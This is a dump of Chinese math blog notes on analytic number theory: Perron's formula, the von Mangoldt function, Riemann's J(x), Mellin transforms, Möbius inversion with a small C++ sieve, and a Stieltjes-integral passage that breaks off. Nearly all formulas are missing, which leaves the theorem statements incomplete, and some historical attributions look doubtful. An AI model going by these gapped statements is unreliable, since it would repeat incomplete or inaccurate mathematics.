定理（带余项的佩龙公式）： 设 的收敛横坐标为 ，存在递增函数 及 使得 且 （ ）。对任意 ， ，当 ， ， ， 时： 若 非整数： 若 为整数： 其中 为离 最近的整数， ， 常数仅与 相关。 这一形式的关键价值在于明确给出了截断误差估计，使数值计算和理论分析成为可能。特别地，当取 时，余项趋于零，即可恢复无穷积分形式。 推导过程佩龙公式的严格推导需要结合狄利克雷级数与梅林变换的性质，以下分四步给出完整证明： 1. 阶跃函数表示引入 Heaviside 单位阶跃函数： 则算术函数部分和可表示为： 这一表示将有限求和转化为无穷求和，虽引入了大量零项，但为积分变换创造了条件。 2. 狄利克雷级数与积分的交换考虑 的 Mellin 变换： 交换积分与求和（需验证一致收敛性，由狄利克雷级数收敛条件保证），对每个 ，积分区域为 ，故： 代入得： 即得到生成函数与和函数的积分关系： 3. Mellin 逆变换根据 Mellin 变换的反演公式，若 ，则： 对 应用逆变换，注意到 ，则： 这就完成了基本形式的推导。 4. 余项估计（有限积分情形）实际应用中需将无穷积分截断为 的有限积分，余项估计基于复分析中的约当引理和被积函数衰减性。以非整数 为例，积分误差主要来自三部分： 垂直积分路径两端的贡献（ 部分） 被积函数在积分路径右侧可能的奇点（由 的解析性质决定） 附近整数点的跳跃间断贡献 通过构造包含积分路径的矩形围道，应用留数定理可将误差表示为 等显式形式。 核心应用素数定理证明中的关键步骤佩龙公式在解析数论中最著名的应用是素数定理的严格证明。考虑切比雪夫函数： 其中 为曼戈尔特函数（当 时 ，否则为 ）。 若（为素数，）其他情况 其生成函数为黎曼 函数的对数导数： 应用佩龙公式得： 通过围道积分将积分线移至左半平面，留数贡献来自 （主项 ）和 函数零点（余项），最终得到显式表达式： 其中 遍历 函数非平凡零点。 这一公式直接表明：若所有非平凡零点满足 （即黎曼猜想的弱形式），则 ，进而推出素数定理 。 一般方法佩龙公式的应用通常遵循以下步骤： 识别数论函数：确定目标和函数（如 ， 等） 构建生成函数：找到对应的狄利克雷级数（通常需证明解析开拓性质） 应用佩龙公式：选择合适的积分路径（实部 ）和截断参数 围道变形与留数计算：将积分线移至左半平面，计算被积函数奇点的留数贡献 余项估计：利用函数增长性、衰减性控制积分误差项 提取渐近主项：分析留数贡献得到和函数的渐近公式 例如在高斯圆问题（求圆内整点个数）中，通过将 （表示 表为两平方和的方法数）的生成函数 代入佩龙公式，可将整点计数转化为对该乘积函数的围道积分。 推广与现代发展L-Perron 公式：解析延拓与连续性改进标准佩龙公式的结果在整数点处存在跳跃间断（源于 Heaviside 函数的定义）。柯兰（2021）提出的改进形式通过引入包含所有极点的半圆形围道，得到了解析的求和函数： 其中围道 包含生成函数的所有极点。该函数满足 ，且在整个复平面解析。例如对常函数 ， ，完美消除了标准公式在整数点的 修正项。 计算复杂性优化原始佩龙公式的余项估计中包含 项，实际计算需平衡 与 的选取。Improved Perron's Formula 通过拆分求和区域、引入非负不减控制函数 ，将余项改进为： 当取 时，余项可优化至 ，显著提升了数值稳定性。"},{"title":"","date":"2025-10-06T10:10:00.000Z","updated":"2025-10-06T10:39:00.000Z","comments":true,"path":"notes/Zeta/26.html","permalink":"https://blog.mhuig.top/notes/Zeta/26","excerpt":"","text":"曼戈尔特函数 曼戈尔特函数 历史背景1894 年，德国数学家汉斯・阿道夫・曼戈尔特（Hans Adolf von Mangoldt）为解决素数定理的严格证明，引入了一个革命性的算术函数 —— 曼戈尔特函数（ ）。 这一函数的诞生源于 19 世纪数论的核心挑战：素数在自然数中的分布规律。 高斯曾猜想素数计数函数 渐近于 ，而黎曼 1859 年的开创性论文通过 函数将素数分布与复平面上的零点联系起来，但其中的辅助函数 过于复杂。曼戈尔特函数的出现，以其简洁的定义和深刻的性质，成为连接素数分布与 函数零点的关键纽带。 定义曼戈尔特函数 对正整数 的取值规则为： 若（为素数，）其他情况 例如， （因 是素数）， （因 ），而 （ 非素数幂）。这一定义的精妙之处在于，它通过对素数幂加权（权重为素数的对数），将分散的素数信息浓缩为可解析处理的形式。 核心性质：除数求和与解析连接曼戈尔特函数的核心性质体现在其与自然数对数函数的深刻联系。对任意 ，有： 其中求和遍历 的所有正除数 。这一恒等式揭示了素数幂与自然数对数的内在关联：例如，当 时，除数为 ，求和 。 其证明依赖于算术基本定理：将 分解为素数幂 ，则除数 中仅素数幂 对求和有贡献，故： 更关键的是，曼戈尔特函数的生成函数直接关联到黎曼 ζ 函数的对数导数。对 ，有： 这一公式的推导始于 ζ 函数的欧拉乘积表示 。两边取对数得 ，对 求导后： 其中最后一步通过代换 实现。这一结果将离散的数论函数 与复变函数 的解析性质紧密绑定，为素数分布的解析研究奠定了基础。 素数定理的证明：Ψ 函数与零点求和曼戈尔特函数的终极意义体现在素数定理的证明中。定义第二切比雪夫函数： 它是 的前缀和。例如， 。切比雪夫已证明，素数定理 等价于 （ ）。 曼戈尔特的突破在于证明了 的显式公式： 其中求和遍历黎曼 函数的非平凡零点 （ ）。这一公式将素数分布（通过 ）直接表示为 与所有非平凡零点贡献的差。为证明素数定理，需证明当 时， ，这等价于 函数在 上无零点 —— 这正是阿达马与德拉瓦莱 - 普桑 1896 年证明素数定理的核心步骤。 高级应用：零点分布与误差项估计曼戈尔特函数的研究推动了 函数零点分布的深入探索。例如，黎曼 - 冯・曼戈尔特公式给出虚部 的非平凡零点个数： 这为零点密度的估计提供了基础。此外， 函数的误差项 的阶与零点实部 密切相关：若所有零点满足 ，则 。黎曼猜想（ ）若成立，将推出 ，这是素数分布误差项的最优估计。 近年来，曼戈尔特函数在广义素数系统（如 Beurling 素数）中也有推广。例如，对满足 Knopfmacher 公理 A 的算术半群，其广义曼戈尔特函数 的 Ψ 函数仍满足类似的显式公式： 其中 为半群的 “密度常数”。这表明曼戈尔特函数的思想已超越经典数论，成为解析数论的通用工具。 结语曼戈尔特函数以其简洁的定义、深刻的性质和广泛的应用，成为数论中连接离散与连续的典范。它不仅是素数定理证明的关键，也是探索素数分布的核心工具。从 的除数求和性质到 函数的显式公式，每一步都体现了算术函数与复分析的完美融合。"},{"title":"","date":"2025-10-06T22:10:00.000Z","updated":"2025-10-07T00:39:00.000Z","comments":true,"path":"notes/Zeta/27.html","permalink":"https://blog.mhuig.top/notes/Zeta/27","excerpt":"","text":"黎曼素数计数函数 J (x) 黎曼素数计数函数 J (x) 1859 年，波恩哈德・黎曼在《论小于给定数值的素数个数》中，首次引入了一个革命性的函数被后世称为黎曼素数计数函数 。这个看似简单的无穷级数 将素数分布问题与复分析深度融合。作为连接初等数论与解析数论的枢纽， 的构造蕴含着黎曼对素数分布规律的深刻洞察，其思想影响延续至今，成为解析数论的核心工具之一。 历史背景：素数分布研究的突破在黎曼之前，数学家们已对素数分布规律进行了长期探索。 欧拉在 1737 年通过 建立了 函数与素数的乘积关系，首次将分析工具引入数论。 高斯与勒让德则分别提出素数定理的猜想形式: 或 。这些工作为黎曼的突破奠定了基础，但均未能揭示素数分布的深层解析结构。 黎曼将 函数从实变量延拓至复平面，并发现其非平凡零点与素数分布的精确联系。他引入 作为中间工具，通过对数变换将欧拉乘积公式转化为积分方程 从而建立起素数计数函数 与复变函数论之间的桥梁。这一处理将素数问题从离散计数转化为连续分析问题. 定义黎曼素数计数函数 J (x) 的现代定义为： 其中 是素数计数函数，表示不超过 的素数个数。该级数的特殊性在于其项数随 的增大而有限：对于给定 ，当 时， ，此时 （除非 且 ）。 例如当 时，级数仅包含 到 的项（因 ），实际计算中具有良好的截断性。 需要注意区分两个容易混淆的 \"黎曼函数\"：本文讨论的 是素数计数函数，而数学分析中著名的黎曼函数（Riemann function）是定义在 上的病态函数 二者除名称关联外无实质联系。 核心性质与数学推导1. J (x) 与 π(x) 的莫比乌斯反演关系 本质上是素数及其幂次的加权计数。通过展开定义式可见： 其中 计数素数平方 ， 计数素数立方 ，依此类推。这种构造使 比 具有更好的解析性质，同时通过莫比乌斯反演可由 还原出 ： 这里 是莫比乌斯函数，当 含平方因子时 ，当 为 个不同素数乘积时 。 反演公式的重要性在于：若能得到 的解析表达式，就能精确计算 。 2. 与 ζ 函数的积分表示黎曼的关键洞见是将 与 函数通过拉普拉斯变换联系起来。对欧拉乘积公式取对数得： 通过分部积分转化为斯蒂尔杰斯积分，最终得到 ( ） 这一方程表明 是 的梅林变换逆变换，通过复积分可表示为： 该积分的计算需要分析 函数的零点分布，黎曼正是通过这一途径发现了素数分布与 函数零点的深刻联系。 3. 显式公式与零点分布黎曼进一步利用留数定理计算上述积分，得到 的显式公式： 其中 遍历 函数的非平凡零点， 是对数积分函数。这一公式揭示了一个惊人事实：素数的分布完全由 函数的零点决定。特别地，若黎曼猜想成立（所有非平凡零点满足 ），则误差项可优化为 ，这将使素数定理的误差达到理论最优。 应用与意义1. 素数定理的证明关键 的引入为素数定理的严格证明提供了技术基础。虽然黎曼未完成证明，但阿达玛与瓦莱 - 普桑 1896 年的工作正是基于他的思想：通过证明 在 上无零点，得到 ，进而推出 。这一过程中， 作为中间函数，其平滑性避免了 的跳跃性带来的分析困难。 2. 计算素数个数的精确方法在实际计算中， 比 更易处理。例如对 ： 通过莫比乌斯反演可从 还原出 。这种方法在计算机出现前是计算 的主要手段。 3. 黎曼猜想的核心地位黎曼猜想断言 函数所有非平凡零点的实部均为 ，这一假设通过 的显式公式直接影响素数分布的误差项。目前已验证前 个零点均满足猜想，但完整证明仍是数学界的 \"圣杯\"。素数分布构成了解析数论的核心，而 与 函数零点的关系则是这一核心的枢纽。 现代拓展与前沿研究当代解析数论对 的推广主要集中在两个方向： 一是将其推广到一般 L 函数的广义素数计数函数，用于研究算术级数中的素数分布； 二是通过零点密度估计（如 Huxley 定理 ）弱化黎曼猜想条件，得到素数定理的误差改进。2024 年 Guth-Maynard 对零密度估计的突破（在 σ≈3 / 4 时达到 ），正是沿着黎曼开辟的道路取得的重要进展。 从欧拉乘积到复平面上的零点分布，黎曼 函数以惊人的优雅连接了数论中最基本的对象与最深邃的方法。它的构造启示我们：看似离散的素数序列，实则蕴含着连续分析的和谐韵律。当我们凝视 的显式公式时，看到的不仅是一个数学表达式，更是人类理性跨越直觉界限、探索宇宙数学结构的永恒追求。黎曼在 160 多年前埋下的这颗种子，至今仍在结出丰硕的果实。"},{"title":"","date":"2025-10-01T10:10:00.000Z","updated":"2025-10-02T00:00:00.000Z","comments":true,"path":"notes/Zeta/24.html","permalink":"https://blog.mhuig.top/notes/Zeta/24","excerpt":"","text":"梅林变换 梅林变换 背景梅林变换的诞生源于 19 世纪末, 梅林受到欧拉、黎曼等先驱工作的启发，特别是黎曼 ζ 函数与积分表示的联系，从而发展了这一变换。 其核心思想是将函数表示为幂函数的线性组合，类似于傅里叶变换将函数分解为三角函数的叠加。线性变换始终是简化复杂问题的核心工具。 梅林变换梅林变换针对定义在正实数轴上的函数 （需满足一定的可积性条件，如局部可积且衰减足够快），其变换 定义为： 其中 是复数参数，通常写作 （ 和 为实数）。这个积分在 的特定区域（如收敛域）内有效。核函数 体现了变换的乘性特征：当 缩放时，变换结果以幂律形式响应。 要理解这个定义，可以考虑它与伽玛函数的关系。例如，如果 ，则梅林变换结果为伽玛函数 ： 逆梅林变换逆变换是梅林变换可逆性的保证，其推导依赖于复变函数中的围道积分。逆公式为： 其中 是实常数，位于 的收敛域内。这个公式可以通过傅里叶逆变换推导： 变量代换：设 ，则 ，原积分变为： 转化为傅里叶变换：令 ，则上式是 的傅里叶变换，核为 。 应用傅里叶逆定理：通过傅里叶逆变换还原 ，再代回 ，即得逆变换公式。 关键性质梅林变换具有一系列重要性质，这些性质可通过直接积分计算或变量代换推导： 线性性：对于常数 和函数 ，有： 这由积分的线性性直接可得。 尺度变换：如果 （ ），则： 推导：代入 ，则： 卷积定理：梅林卷积定义为 其变换满足： 推导：通过交换积分顺序和变量代换： 令 与矩生成函数的关系：如果 是概率密度函数，则其 阶原点矩可通过梅林变换求得： 这是因为 。 与其他变换的联系梅林变换与拉普拉斯变换和傅里叶变换可通过变量代换相互转化： 与拉普拉斯变换：令 ，则： 这正是 的拉普拉斯变换。 与傅里叶变换：类似地，通过 可转化为傅里叶变换形式。 傅里叶变换的核为 ，而梅林变换的核为 ，体现了从加性结构到乘性结构的转变。 与傅里叶变换或拉普拉斯变换相比，梅林变换更侧重于函数的积性结构。例如，如果函数在缩放变换下具有对称性，梅林变换能更自然地捕捉这种特性。 From ZhiHu-TravorLZH 笔者认为下面这段有收藏价值就搬过来了。1、各种积分变换的反演公式下面我们就来做一个 self-contained 的推导吧！引理（正弦积分及其渐近线）：定义 ，则有：因此Fourier 反演定理：已知 Fourier 变换公式为 ，现在我们考虑计算：由于积分未必收敛，我们实际上计算的是它的柯西主值，现在我们做进一步展开：现在进行分部积分，得：由于 Fourier 变换的存在性意味着 f 是平方可积的，因此有 ，于是根据 ，对原式求 的极限可得：综上所述，我们得到了第一个积分变换工具 ——Fourier 反演定理：Laplace 逆变换：根据定义，可知函数 f 的拉氏变换被定义为 ，现在设 满足 收敛，并定义函数 ：则根据 ，有：但事实上，根据 的定义，可知于是 变成了：令 ，我们便得到了拉氏变换的 Mellin 反演公式：Mellin 变换在解析数论中，有一种常用的积分变换叫 Mellin 变换：现在令 则有：现在设 使得 收敛则我们可以设 得：利用刚刚推导的 Fourier 反演定理，我们便能得到：于是：现在设 ，我们就得到了 Mellin 变换的反演公式：2、Zeta 函数与素数计数函数之关系根据算数基本定理可知 Zeta 函数满足欧拉乘积公式：对两侧取对数，得：现在利用 RS 积分，得：因此有3、琴生公式用 来表示全纯函数 在 中的零点，则：现在设 ，则有：利用柯西积分公式，可知等式左侧就是 ，即：而由于当 时有 ，被求和部分的积分都是零，遂证毕。 双曲正割函数的梅林变换双曲正割函数（ ） 是一种重要的双曲函数，定义为双曲余弦函数的倒数： 其图像呈现钟形曲线特征，在原点处达到最大值 1，向两侧逐渐衰减并以 x 轴为渐近线。 计算 的梅林变换。 梅林变换的定义与一般形式函数 的梅林变换定义为： 收敛域 对于 ，其变换需满足收敛条件 （由 的衰减性决定）。 的梅林变换推导级数展开法利用恒等式 ，可展开为： 代入梅林变换公式： 此级数可表示为 Dirichlet beta 函数 或 Hurwitz zeta 函数 的组合： 当 时： 当 时： 当 时： 为 Dirichlet beta 函数）。 推导过程 级数展开代入： 利用恒等式：代入 Mellin 变换：积分转化为 Gamma 函数： 内层积分是 Gamma 函数的定义形式：此处 ，故：级数化简为 Hurwitz zeta 函数： 将求和式拆解：通过待定系数法解得 ，即：进一步表示为 Hurwitz zeta 函数的线性组合：函数最终得：其中 拉马努金主定理（Ramanujan's Master Theorem） 若 的泰勒展开为 ，则： 其中 是展开系数，需解析延拓至复平面。 Meijer G 函数表示 通过梅林变换的卷积性质， 可表为 Meijer G 函数： 适用于任意 。 特殊 k 值的封闭形式 值 梅林变换封闭形式 收敛域 偶数 （ 为 的多项式） 奇数 ( 为组合系数， ) 注： 其中 为 Hurwitz zeta 函数。 可解析延拓至整个复平面，在 处有留数 ，且满足函数方程： 收敛域与解析延拓收敛域：需满足 ，否则积分在 或 处发散。 解析延拓：通过余元公式 或留数定理，可将变换延拓至 （除极点外）。 极点位置：位于 （ ），留数与 的导数值相关。 与其他特殊函数的联系Gamma 函数：始终作为乘性因子出现，源于积分核 的变换性质。 Zeta 函数：偶数 时关联 Riemann zeta 函数 ，奇数 时关联 Dirichlet beta 函数 。 超几何函数：部分情形下可表为广义超几何函数 ，例如： 结论 的梅林变换统一表示为： 其中 是由 决定的特殊函数（Dirichlet beta、Zeta 或 Meijer G 函数），收敛域为 。 取整函数的逆梅林变换ζ 函数的定义式（对 ）为 。通过阿贝尔变换或分部积分，可将其与取整函数关联： 当 注意到积分下限可扩展至 （因 对 ），上式等价于 的梅林变换形式。应用逆梅林变换公式，直接得到： 收集的片段片段 1 片段 2 其中 ，且级数在 和 时收敛。 片段 3 片段 4For one has 片段 5佩龙公式 (Perron's formula)"},{"title":"","date":"2025-10-07T00:18:00.000Z","updated":"2025-10-07T01:20:00.000Z","comments":true,"path":"notes/Zeta/28.html","permalink":"https://blog.mhuig.top/notes/Zeta/28","excerpt":"","text":"莫比乌斯反演 莫比乌斯反演 莫比乌斯反演定理作为连接局部与整体计数关系的桥梁，其核心思想可追溯至 19 世纪早期数论研究。1832 年，德国数学家奥古斯特・费迪南德・莫比乌斯在《一种特殊类型的级数反演》中首次引入莫比乌斯函数，为解决 \"已知倍数计数求精确计数\" 的问题提供了数学工具。这一发现后来被证明是组合数学中偏序集反演的特例，其思想渗透到数论、代数、分析乃至物理等多个领域。这里将系统阐述莫比乌斯反演的历史渊源、数学基础、严格推导及其在现代科学中的应用。 历史背景与数学渊源莫比乌斯反演的雏形可追溯至 18 世纪欧拉对素数分布的研究，但其严格数学形式由莫比乌斯于 1832 年正式建立。当时莫比乌斯致力于解决级数反演问题，即给定级数 如何反推出系数 的表达式。尽管其原始工作未直接涉及数论函数的反演，但他定义的莫比乌斯函数 后来被证明具有深刻的数论意义： 当 为 时取值 ，为 个不同素数乘积时取值 ，含有平方因子时取值 0。 19 世纪末，戴德金将莫比乌斯函数推广至代数数论领域，而 20 世纪初布伦（Bruns）首次将其应用于傅里叶系数计算。1947 年温特纳（Wintner）进一步发展了这一思想，为后来的算术傅里叶变换（AFT）奠定基础。1964 年，盖尔芳特和希洛夫引入广义函数理论，使得莫比乌斯反演能够处理连续变量情形，而 1988 年塔夫茨（Tufts）和萨达西文（Sadasiv）提出的 AFT 算法，则展示了莫比乌斯反演在信号处理中的计算优势，其并行处理能力甚至超越了快速傅里叶变换（FFT）。 在数学理论层面，莫比乌斯反演的本质在 20 世纪中期通过偏序集理论得到深刻揭示。1935 年，魏尔（Weyl）指出莫比乌斯反演是局部有限偏序集上的一般反演原理的特例。对于自然数集上的整除关系偏序集 ，其莫比乌斯函数恰好对应经典数论中的定义；而对于集合包含关系偏序集 ，莫比乌斯函数则退化为容斥原理中的系数 。这种统一性使得莫比乌斯反演成为连接离散与连续、局部与整体的数学桥梁。 莫比乌斯函数与狄利克雷卷积莫比乌斯函数的定义看似简单，却蕴含着深刻的数论性质。严格定义如下：对任意正整数 若若为个不同素数之积若含有平方因子 这一定义直接反映了素数因子的组合结构。 例如， ，而 。 莫比乌斯函数的核心性质是其积性：对互素整数 ，有 。 这一性质可通过素因子分解直接验证：若 互素，则它们的素因子完全不同，故其乘积的素因子个数为两者之和，符号自然相乘；若其中之一含有平方因子，则乘积也含有平方因子，结果为 。 莫比乌斯函数与数论函数之间的深刻联系通过狄利克雷卷积运算得以体现。 对于两个数论函数 ，其狄利克雷卷积定义为： 这一运算满足交换律和结合律，构成数论函数集合上的幺半群结构。在这个代数结构中，常数函数 与莫比乌斯函数 互为逆元，即： 若若 这一关键等式被称为莫比乌斯函数的 \"筛选性质\"，其证明需利用算术基本定理： 将 分解为素数幂乘积 则非零贡献仅来自无平方因子的除数 （其中 ），每个子集 贡献 ，总和为 狄利克雷卷积的单位元是单位函数 （其中方括号为 Iverson 符号），满足 。 这一结构使得数论函数空间成为具有单位元的交换半群，而莫比乌斯函数与常数函数的互逆关系，为莫比乌斯反演提供了代数基础。值得注意的是，积性函数在狄利克雷卷积下保持封闭性，这使得我们可以通过素数幂情形的计算来推导一般积性函数的性质。 莫比乌斯反演定理的严格推导莫比乌斯反演定理建立了两个数论函数之间的重要关系。经典形式表述如下： 若对所有正整数 ，有 ，则 。 这一命题的充分性和必要性均可通过狄利克雷卷积的性质严格证明。 必要性证明：假设 ，则在等式两边同时与 作狄利克雷卷积： 这里依次使用了狄利克雷卷积的结合律、 与 的互逆关系，以及单位元性质。这表明 可以由 通过与 的卷积得到，即： 通过变量替换 （即 ），可改写为更常见的形式： 充分性证明：假设 ，则： 从而完成了等价性的证明。这一简洁证明展现了代数结构方法的威力，避免了传统证明中复杂的双重求和交换。 莫比乌斯反演的另一种重要形式涉及倍数求和： 若 ，则 这一形式可通过变量替换 转化为前一种形式，此时 ，反演公式变为 。 这种 \"倍数反演\" 在处理素数分布问题时尤为重要，例如用于将黎曼 函数与素数计数函数联系起来。 值得注意的是，莫比乌斯反演可以推广到更一般的数学结构。 在局部有限偏序集 上，若定义 zeta 函数 （当 时），则其逆函数 满足 对于自然数的整除偏序集，这恰好回到经典莫比乌斯函数；对于集合包含偏序集，得到容斥原理系数；对于线性有序集，则得到差分算子。这种惊人的统一性使得莫比乌斯反演成为现代数学中的通用工具。 推广形式与高维反演莫比乌斯反演的思想可以从多个维度进行推广，既包括连续变量情形，也涵盖高维离散结构。这些推广不仅拓展了理论边界，也为实际应用提供了强大工具。 连续变量的莫比乌斯反演是将自然数集上的整除关系推广为正实数集上的比例关系。对于连续函数 在适当收敛条件下，反演公式为： 进一步将其推广为更一般形式：若 ，则 ，其中 为任意实数。 这一推广使得莫比乌斯反演能够处理具有标度不变性的物理问题。 高维离散反演的典型代表是 Gauss 整环上的莫比乌斯反演。Gauss 整环 是唯一分解整环，其单位群为 。定义 Gauss 整数的莫比乌斯函数：当 为单位元时 ，为 个互不相伴素元乘积时 ，含有平方因子时 .二维算术傅里叶变换公式： 其中 为采样点处的函数值。这一结果将 AFT 算法推广到图像处理领域，显著减少了传统 FFT 所需的采样点数。 代数整数环上的反演是更高层次的推广。对于 次代数数域 的代数整数环 ，若 是单域（即具有唯一分解性），则可定义莫比乌斯函数 ：当 为单位时取值 ，为 个不同素理想乘积时取值 ，否则为 。通过建立 维整点与代数整数环的同构，将莫比乌斯反演推广到 维情形，得到高维算术傅里叶变换公式： 其中 为高维指标。这一成果为高维信号处理和量子多体问题提供了新的数学工具。 值得注意的是，当代数数域不具有唯一分解性时，莫比乌斯函数的定义需通过递推公式 （对 的真因子 求和）。这种定义方式避免了对素因子分解的依赖，使得莫比乌斯反演能够应用于更广泛的代数结构。 应用实例与计算方法莫比乌斯反演在数论、组合数学和科学计算中具有广泛应用，其核心价值在于将复杂的 \"精确计数\" 问题转化为相对简单的 \"倍数计数\" 问题。 数论中的经典应用欧拉函数的反演：欧拉函数 表示小于 且与 互素的整数个数，满足 。应用莫比乌斯反演，可得到： 例如，对 ，其因数为 ，故 ，与直接计算结果一致。这一公式揭示了欧拉函数与莫比乌斯函数的深刻联系，为素数分布研究提供了工具。 素数计数函数：黎曼 函数的倒数可表示为 通过莫比乌斯反演可将素数计数函数 表示为： 其中 为曼戈尔特函数的累积和 。这一公式在解析数论中具有基础地位，展现了莫比乌斯反演连接解析与数论的桥梁作用。 组合计数中的应用最大公约数问题：计算区间 中互素数对的个数，是算法竞赛中的经典问题。通过莫比乌斯反演，可将其转化为倍数计数问题： 其中方括号为 Iverson 符号 。这一转化将双层循环转化为单层求和，结合数论分块技术，可将时间复杂度从 降至 。具体实现时，需预先通过线性筛计算莫比乌斯函数值： void get_mu(int n) { vector&lt;int&gt; mu(n+1), is_prime(n+1, 1); vector&lt;int&gt; primes; mu[1] = 1; for (int i = 2; i &lt;= n; ++i) { if (is_prime[i]) { primes.push_back(i); mu[i] = -1; } for (int p : primes) { if (i * p &gt; n) break; is_prime[i*p] = 0; if (i % p == 0) { mu[i*p] = 0; break; } mu[i*p] = -mu[i]; } }} 这一算法通过素数筛法在线性时间内计算莫比乌斯函数值，为后续反演计算奠定基础。 约数个数问题：计算 （其中 为约数函数），可利用约数函数的积性性质 ，通过莫比乌斯反演转化为： 这一转化将复杂的二维约数求和转化为可高效计算的形式。 科学计算中的应用算术傅里叶变换（AFT）：传统 FFT 算法需要 次运算，而基于莫比乌斯反演的 AFT 算法将傅里叶系数计算转化为： 其中 为采样值 。由于莫比乌斯函数的稀疏性（大部分取值为 0），AFT 的实际运算量显著低于 FFT，且具有天然的并行计算特性。1993 年，凯利（Kelley）和马迪塞蒂（Madisetti）设计的 VLSI 架构证明了 AFT 在硬件实现上的优势，其面积复杂度仅为 FFT 的 。 小波系数计算：将莫比乌斯反演应用于小波分析，得到 Haar 小波系数的反演公式： 其中 为小波变换的采样值 。这一方法避免了传统 Mallat 算法的迭代过程，可直接计算任意小波系数，在图像处理中展现出优异的压缩性能。 结论莫比乌斯反演从 19 世纪数论中的一个特殊工具，发展为现代数学和科学中的通用方法，其演化历程折射出数学思想的深刻统一性。通过狄利克雷卷积的代数框架，我们得以理解莫比乌斯反演的本质是局部有限偏序集上的一般反演原理在数论函数空间的具体表现。统一了离散与连续、有限与无限的反演问题。 莫比乌斯反演的魅力在于其将复杂问题 \"对偶化\" 的能力，通过引入适当的 \"倍数计数\" 函数，将困难的精确计数转化为简单的求和运算。这种思想方法不仅是数学研究的有力工具。"},{"title":"","date":"2025-10-07T08:18:00.000Z","updated":"2025-10-07T08:20:00.000Z","comments":true,"path":"notes/Zeta/29.html","permalink":"https://blog.mhuig.top/notes/Zeta/29","excerpt":"","text":"斯蒂尔杰斯积分 斯蒂尔杰斯积分 1894 年，荷兰数学家托马斯・斯蒂尔杰斯（Stieltjes，Thomas Jan）在其经典《连分数的研究》中首次提出了一种全新的积分概念，这一概念后来以他的名字命名为斯蒂尔杰斯积分。这一发明源于他对矩问题和连分数理论的深入研究，当时他发现传统的黎曼积分无法有效处理质量分布的一般情形，特别是当质量既包含连续分布又包含离散质点时。斯蒂尔杰斯积分的核心创新在于将积分和中的区间长度替换为一个辅助函数的增量，从而将黎曼积分作为特殊情形包含其中，同时极大地拓展了积分的应用范围。这种推广不仅解决了当时矩问题研究中的关键瓶颈，更为 20 世纪测度论和泛函分析的发展奠定了基础。 历史背景与思想起源斯蒂尔杰斯的数学道路充满传奇色彩。这位三次高考失利、从未获得正式大学学位的荷兰数学家，通过自学掌握了当时最前沿的数学知识，并与埃尔米特、庞加莱等数学巨匠保持密切通信。他的研究最初集中在天体力学和连分数理论，正是在探索连分数与定积分的渐近关系时，斯蒂尔杰斯发现了传统积分概念的局限性。 19 世纪末的数学界正面临着一系列挑战：如何严格处理不连续函数？如何统一描述连续与离散的质量分布？如何将力学中的矩问题推广到更一般的情形？斯蒂尔杰斯在研究无穷区间上的矩问题时意识到，需要一种能够同时处理连续变量和离散质点的积分工具。传统的黎曼积分将区间分割为小区间并以其长度作为权重，而斯蒂尔杰斯创造性地用一个分布函数的增量替代区间长度，这一思想直接导致了斯蒂尔杰斯积分的诞生。 这一突破的历史必然性体现在两个方面：一方面，19 世纪末实分析的发展已为积分概念的推广积累了足够的技术准备，包括柯西、黎曼、达布等人对积分理论的系统化工作；另一方面，物理学中对非均匀质量分布和概率统计中对离散与连续分布统一描述的需求，为新积分理论提供了强大的应用动机。斯蒂尔杰斯的贡献在于将这些零散的思想汇聚成一个严谨的数学框架，并通过连分数理论揭示了其深刻的分析学意义。 数学基础：有界变差函数与积分定义有界变差函数理论斯蒂尔杰斯积分的建立依赖于一个关键概念 —— 有界变差函数。设函数 定义在区间 上，对于任意分割 ，称 为 关于分割 的变差。若所有可能变差的上确界有限，即 则称 是 上的有界变差函数，记为 。 有界变差函数具有一系列深刻性质： 分解定理：任何有界变差函数都可表示为两个单调递增函数之差，即 ，其中 （全变差函数）和 均为单调递增函数。这一分解揭示了有界变差函数与单调函数的本质联系，为斯蒂尔杰斯积分的研究提供了重要工具。 几乎处处可微性：有界变差函数几乎处处可微，且其导数勒贝格可积（这一结果后来由勒贝格证明）。 全变差的可加性：对任意 ，有 。这一性质表明全变差函数是区间可加的，类似于测度的性质。 斯蒂尔杰斯积分的定义设 和 是定义在 上的有界函数，对任意分割 和介点 ，构造斯蒂尔杰斯积分和： 记分割的细度为 。若当 时，上述积分和的极限存在且与分割方式及介点选取无关，则称 关于 在 上斯蒂尔杰斯可积，记为 为了使这一定义严格化，斯蒂尔杰斯引入了达布 - 斯蒂尔杰斯上下和： 并定义上下积分： 当上下积分相等时，称 关于 可积。 可积性条件斯蒂尔杰斯积分的存在性依赖于 和 的相互关系，核心结果包括： 连续性与有界变差的对偶性： 若 （连续）且 （有界变差），则 关于 可积。 若 且 ，则 关于 可积。 这一惊人的对偶关系表明，连续性和有界变差是斯蒂尔杰斯积分存在的互补条件，这为分部积分公式奠定了基础。 勒贝格型判据： 关于 可积的充要条件是，对任意 ，存在分割 ，使得函数 的振幅大于 的那些子区间上， 的变差总和小于 。形式化地，记 则对任意 ，存在分割 使得 。 核心性质与定理线性与可加性斯蒂尔杰斯积分具有自然的线性性质： 对被积函数的线性：若 关于 可积， ，则 关于 可积，且 对积分函数的线性：若 关于 可积， ，则 关于 可积，且 区间可加性：对任意 ，有 分部积分公式斯蒂尔杰斯积分的分部积分公式揭示了积分中两个函数的对称关系：若 且 ，则 这一公式的证明巧妙地利用了积分和的重排： 其中 是子区间中的介点。当分割细度趋于零时，两端的积分和分别收敛到相应的斯蒂尔杰斯积分。 分部积分公式不仅具有理论意义，还提供了计算斯蒂尔杰斯积分的有效工具。特别地，当 是绝对连续函数时，这一公式退化为黎曼积分的分部积分公式。 中值定理类似于黎曼积分，斯蒂尔杰斯积分也有中值定理，但其形式依赖于 的单调性： 第一中值定理：设 ， 为单调递增函数，则存在 使得 第二中值定理：设 ， 且单调，则存在 使得 这些中值定理在证明积分估计和渐近公式中发挥着关键作用，特别是在概率统计和数值分析中。 与黎曼积分的联系当积分函数 时，斯蒂尔杰斯积分退化为黎曼积分： 更一般地，若 可导且 （黎曼可积），则斯蒂尔杰斯积分可化为黎曼积分： 这一结果建立了两种积分之间的桥梁，表明斯蒂尔杰斯积分确实是黎曼积分的自然推广。 应用与推广数学物理中的矩问题斯蒂尔杰斯积分的最初动机之一是解决矩问题。给定一个矩序列 ，其中 ，矩问题研究如何由这些矩确定测度 。斯蒂尔杰斯通过引入以分布函数 为权重的积分 将离散质点系的矩和连续分布的矩统一起来，从而建立了经典矩问题的理论框架。 这一工作的深远影响在于，它将分析学、概率论和算子理论联系起来，为后来希尔伯特空间中自伴算子的谱理论奠定了基础。特别地，斯蒂尔杰斯矩问题的解的唯一性条件（Carleman 